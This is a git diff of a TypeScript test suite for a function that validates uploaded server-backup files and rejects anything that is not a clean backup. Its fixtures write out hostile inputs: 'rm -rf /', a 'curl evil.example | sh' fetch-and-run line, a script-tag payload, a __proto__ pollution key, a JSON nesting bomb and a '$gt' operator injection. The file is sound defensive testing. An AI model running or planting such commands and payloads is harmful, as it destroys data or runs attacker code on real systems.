@@ -1,4 +1,12 @@
-import { buildBackup, placeKind, planBackup, backupDocument } from "@testify/shared";
+import {
+	BACKUP_LIMITS,
+	backupDocument,
+	type BackupFile,
+	buildBackup,
+	placeKind,
+	planBackup,
+	readBackupFile,
+} from "@testify/shared";
 
 const SOURCE_STARS = "100000000000000001";
 const HERE_STARS = "200000000000000001";
@@ -111,22 +119,70 @@ describe("planBackup", () => {
 	});
 });
 
-describe("backupDocument", () => {
-	/** A file is whatever somebody saved, so no key in it may reach an object's prototype. */
-	it("refuses anything that is not a backup or names a place by something but an id, and drops a prototype key", () => {
-		const base = buildBackup("S", {}, source);
-		expect(backupDocument.safeParse({ kind: "other" }).success).toBe(false);
-		expect(backupDocument.safeParse({ ...base, channels: { general: "x" } }).success).toBe(false);
-		expect(backupDocument.safeParse({ ...base, sections: { "starboard.update": { "x-y": 1 } } }).success).toBe(false);
+describe("readBackupFile", () => {
+	const valid = buildBackup("Testify HQ", reads, source);
+	const json = (value: unknown): string => JSON.stringify(value);
+	const file = (content: string | number[], name = "backup.json", type = "application/json"): BackupFile => ({
+		name,
+		type,
+		bytes: typeof content === "string" ? new TextEncoder().encode(content) : Uint8Array.from(content),
+	});
+	const withSections = (sections: unknown): string => json({ ...valid, sections });
 
-		const parsed = backupDocument.parse({
-			...base,
-			channels: JSON.parse('{"__proto__":{"polluted":true}}') as unknown,
-		});
-		expect(Object.hasOwn(parsed.channels, "__proto__")).toBe(false);
+	/** A file is whatever somebody chose, so nothing in it may be read as settings until it is plainly a backup. */
+	it("refuses programs, scripts, archives and anything else that is not exactly a backup", () => {
+		const cases: Record<string, [BackupFile, string]> = {
+			"a Windows program": [file([0x4d, 0x5a, 0x90, 0x00]), "program"],
+			"a Linux program": [file([0x7f, 0x45, 0x4c, 0x46, 0x02]), "program"],
+			"a shell script": [file("#!/bin/bash\nrm -rf /\n"), "program"],
+			"a zip": [file([0x50, 0x4b, 0x03, 0x04, 0x14]), "program"],
+			"a picture, which is not text": [file([0x89, 0x50, 0x4e, 0x47, 0x0d]), "program"],
+			"a backup named .exe": [file(json(valid), "backup.exe"), "notJson"],
+			"a double extension": [file(json(valid), "backup.json.exe"), "notJson"],
+			"a script's type": [file(json(valid), "backup.json", "text/x-sh"), "notJson"],
+			"a page with a script": [file("<script>alert(1)</script>"), "notBackup"],
+			"a script without a #!": [file("echo hi && curl evil.example | sh"), "notBackup"],
+			"nesting no backup has": [file(`{"kind":${"[".repeat(100_000)}${"]".repeat(100_000)}}`), "notBackup"],
+			"a prototype key": [
+				file(json(valid).replace('"channels":{', '"channels":{"__proto__":{"polluted":true},')),
+				"notBackup",
+			],
+			"a key a backup never has": [file(json({ ...valid, run: "process.exit()" })), "notBackup"],
+			"a section a backup never has": [file(withSections({ "eval.run": { code: "1" } })), "notBackup"],
+			"a field Put back never sends": [file(withSections({ "starboard.update": { publish: true } })), "notBackup"],
+			"a database operator as a value": [
+				file(withSections({ "starboard.update": { threshold: { $gt: 0 } } })),
+				"notBackup",
+			],
+			"a place named by something but an id": [file(json({ ...valid, channels: { general: "x" } })), "notBackup"],
+			"too large": [file(" ".repeat(BACKUP_LIMITS.maxBytes + 1)), "tooLarge"],
+		};
+
+		const refused = Object.fromEntries(Object.entries(cases).map(([label, [input]]) => [label, readBackupFile(input)]));
+		expect(refused).toEqual(
+			Object.fromEntries(Object.entries(cases).map(([label, [, expected]]) => [label, expected])),
+		);
 		expect(({} as Record<string, unknown>).polluted).toBeUndefined();
 	});
 
+	/** The values sent on are what each route's schema made of them, so hidden and control characters never leave. */
+	it("reads a real backup, and sends its settings cleaned", () => {
+		const text = json({
+			...valid,
+			guildName: "Testify\u202e HQ",
+			sections: { ...valid.sections, "goodbye.update": { message: "Bye\u200b {user}\u0007" } },
+		});
+		const read = readBackupFile(file(`\uFEFF${text}`, "Testify-HQ.JSON", ""));
+		if (typeof read === "string") throw new Error(`Refused as ${read}.`);
+
+		expect(read.guildName).toBe("Testify HQ");
+		expect(planBackup(read, here, {}).steps.find((step) => step.action === "goodbye.update")?.body).toEqual({
+			message: "Bye {user}",
+		});
+	});
+});
+
+describe("placeKind", () => {
 	it("reads a field as a channel or a role by the reach check's own rule", () => {
 		expect([
 			placeKind("lobbyChannelId"),
